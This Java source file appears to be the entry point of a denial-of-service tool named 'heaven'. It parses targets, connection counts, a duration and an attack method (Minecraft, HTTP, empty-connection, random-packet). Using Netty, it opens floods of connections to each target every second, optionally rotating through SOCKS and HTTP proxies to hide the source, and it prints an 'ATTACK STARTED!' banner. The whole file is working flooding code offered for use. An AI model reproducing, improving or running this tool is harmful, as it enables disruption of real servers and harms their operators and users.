package heaven;

import heaven.attacks.Method;
import heaven.attacks.implementations.EmptyConnection;
import heaven.attacks.implementations.Http;
import heaven.attacks.implementations.Mc;
import heaven.attacks.implementations.RandomPacket;
import heaven.helpers.*;
import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufAllocator;
import io.netty.buffer.PooledByteBufAllocator;
import io.netty.channel.*;
import io.netty.channel.epoll.EpollEventLoopGroup;
import io.netty.channel.epoll.EpollSocketChannel;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.proxy.HttpProxyHandler;
import io.netty.handler.proxy.Socks4ProxyHandler;
import io.netty.handler.proxy.Socks5ProxyHandler;

import java.net.InetSocketAddress;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class Instance {
    public static int bufferLimit;
    static ProxyLoader loader;
    static long lastTime;

    public static void main(String[] arguments) {
        try {
            Fields fields = new Fields(arguments);
            String rawTargets = fields.getValue("targets");
            InetSocketAddress[] targets = new InetSocketAddress[rawTargets.contains(",") ? rawTargets.split(",").length : 1];
            for (int index = 0; index < targets.length; index++) {
                String[] target = rawTargets.split(",")[index].split(":");
                targets[index] = new InetSocketAddress(target[0], Integer.parseInt(target[1]));
            }
            try {
                loader = new ProxyLoader(fields.getValue("file"));
            } catch (Exception ignored) {

            }
            int processors = Integer.parseInt(fields.getValue("processors"));
            int connections = Integer.parseInt(fields.getValue("connections"));
            int duration = Integer.parseInt(fields.getValue("duration"));
            if (rawTargets.charAt(rawTargets.length() - 1) == ',')
                rawTargets = rawTargets.substring(0, rawTargets.length() - 1);
            Method method = fields.getValue("method").equalsIgnoreCase("mc") ? new Mc(fields.getValue("hostname"), McVersion.getBy(fields.getValue("version")), Mc.Type.getBy(fields.getValue("type"))) : fields.getValue("method").equalsIgnoreCase("http") ? new Http(fields.getValue("hostname"), HttpVersion.getBy(fields.getValue("version")), Http.Type.getBy(fields.getValue("type")), Integer.parseInt(fields.getValue("requests"))) : fields.getValue("method").equalsIgnoreCase("empty-connection") ? new EmptyConnection() : fields.getValue("method").equalsIgnoreCase("random-packet") ? new RandomPacket(Integer.parseInt(fields.getValue("size"))) : null;
            if (targets.length < 1 || processors < 1 || connections < targets.length || duration < 1 || method == null)
                exceptionCaught();
            boolean isLinuxMachine = System.getProperty("os.name").toLowerCase().contains("linux");
            ThreadPoolExecutor worker = new ThreadPoolExecutor(0, processors, 0, TimeUnit.NANOSECONDS, new SynchronousQueue<>(), task -> Thread.ofVirtual().unstarted(task), new ThreadPoolExecutor.CallerRunsPolicy());
            worker.allowCoreThreadTimeOut(false);
            bufferLimit = (isLinuxMachine ? 64 : 32) * 1024;
            Bootstrap bootstrap = new Bootstrap().group(isLinuxMachine ? new EpollEventLoopGroup(processors, worker) : new NioEventLoopGroup(processors, worker)).channel(isLinuxMachine ? EpollSocketChannel.class : NioSocketChannel.class).option(ChannelOption.ALLOCATOR, ByteBufAllocator.DEFAULT).option(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT).option(ChannelOption.RCVBUF_ALLOCATOR, new FixedRecvByteBufAllocator(8192)).option(ChannelOption.MESSAGE_SIZE_ESTIMATOR, DefaultMessageSizeEstimator.DEFAULT).option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 5000).option(ChannelOption.MAX_MESSAGES_PER_WRITE, Integer.MAX_VALUE).option(ChannelOption.WRITE_SPIN_COUNT, 16).option(ChannelOption.WRITE_BUFFER_WATER_MARK, new WriteBufferWaterMark(bufferLimit, bufferLimit * 2)).option(ChannelOption.ALLOW_HALF_CLOSURE, false).option(ChannelOption.AUTO_READ, true).option(ChannelOption.AUTO_CLOSE, true).option(ChannelOption.SO_KEEPALIVE, true).option(ChannelOption.SO_SNDBUF, bufferLimit).option(ChannelOption.SO_RCVBUF, bufferLimit).option(ChannelOption.SO_REUSEADDR, true).option(ChannelOption.SO_LINGER, 0).option(ChannelOption.IP_TOS, 0x18).option(ChannelOption.TCP_NODELAY, true).handler(new ChannelInitializer<>() {
                @Override
                protected void initChannel(Channel channel) {
                    InetSocketAddress target = (InetSocketAddress) channel.remoteAddress();
                    ChannelHandler handler = new ChannelInboundHandlerAdapter() {
                        @Override
                        public void channelActive(ChannelHandlerContext channel) {
                            ByteBuf packet = method.createData(target);
                            if (packet == null) channel.close();
                            else channel.writeAndFlush(packet);
                        }
                    };
                    if (loader == null) channel.pipeline().addFirst(handler);
                    else {
                        Proxy proxy = loader.getNext();
                        channel.pipeline().addFirst(proxy.username == null ? proxy.type == Proxy.Type.SOCKS_4 ? new Socks4ProxyHandler(proxy.address) : proxy.type == Proxy.Type.SOCKS_5 ? new Socks5ProxyHandler(proxy.address) : new HttpProxyHandler(proxy.address) : proxy.type == Proxy.Type.SOCKS_5 ? new Socks5ProxyHandler(proxy.address, proxy.username, proxy.password) : new HttpProxyHandler(proxy.address, proxy.username, proxy.password)).addLast(handler);
                    }
                }

                @Override
                public void exceptionCaught(ChannelHandlerContext channel, Throwable throwable) {
                    channel.close();
                }
            });
            if (isLinuxMachine) bootstrap.option(ChannelOption.TCP_FASTOPEN_CONNECT, true);
            lastTime = System.currentTimeMillis();
            Thread.ofPlatform().start(() -> {
                while (!Thread.interrupted()) {
                    long currentTime = System.currentTimeMillis();
                    if (currentTime - lastTime >= 1000) {
                        int index = 0;
                        while (index < connections) for (InetSocketAddress target : targets) {
                            bootstrap.connect(target);
                            index++;
                        }
                        lastTime = currentTime;
                    }
                }
            });
            System.out.println(System.lineSeparator() + System.lineSeparator() + " ██╗  ██╗███████╗ █████╗ ██╗   ██╗███████╗███╗  ██╗\n" + " ██║  ██║██╔════╝██╔══██╗██║   ██║██╔════╝████╗ ██║\n" + " ███████║█████╗  ███████║╚██╗ ██╔╝█████╗  ██╔██╗██║\n" + " ██╔══██║██╔══╝  ██╔══██║ ╚████╔╝ ██╔══╝  ██║╚████║\n" + " ██║  ██║███████╗██║  ██║  ╚██╔╝  ███████╗██║ ╚███║\n" + " ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚══╝\n" + System.lineSeparator() + " ATTACK STARTED!" + System.lineSeparator() + System.lineSeparator() + " TARGET" + (rawTargets.contains(",") ? "S" : "") + ": " + rawTargets + System.lineSeparator() + (loader == null ? "" : " PROXIES: " + loader.proxies.size() + System.lineSeparator()) + " PROCESSORS: " + processors + System.lineSeparator() + " CONNECTIONS: " + connections + System.lineSeparator() + " DURATION: " + duration + " second" + (duration > 1 ? "s" : "") + System.lineSeparator() + " METHOD: " + fields.getValue("method").toLowerCase() + System.lineSeparator() + System.lineSeparator());
            for (int index = 0; index < duration; index++) {
                Thread.sleep(1000L);
                Runtime.getRuntime().gc();
            }
            System.exit(0);
        } catch (Exception _) {
            exceptionCaught();
        }
    }

    public static void exceptionCaught() {
        System.exit(1);
    }
}
